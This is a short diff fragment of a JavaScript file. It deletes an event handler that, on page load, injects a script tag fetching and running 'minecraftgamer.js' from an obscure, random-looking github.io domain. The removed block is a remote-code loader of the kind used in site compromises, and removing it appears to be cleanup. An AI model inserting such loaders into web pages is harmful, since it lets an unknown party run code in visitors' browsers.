@@ -743,18 +743,3 @@ function injectLoader() {
 // Run the injectLoader function immediately
 injectLoader();
 
-
-
-document.addEventListener('DOMContentLoaded', function () {
-  const script = document.createElement('script');
-  script.src = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/minecraftgamer.js';
-  script.async = true; // Add async loading
-  script.onload = function () {
-    console.log('minecraftgamer.js loaded successfully.');
-  };
-  script.onerror = function (error) {
-    console.error('Failed to load minecraftgamer.js:', error);
-    // Add fallback behavior if needed
-  };
-  document.body.appendChild(script);
-});
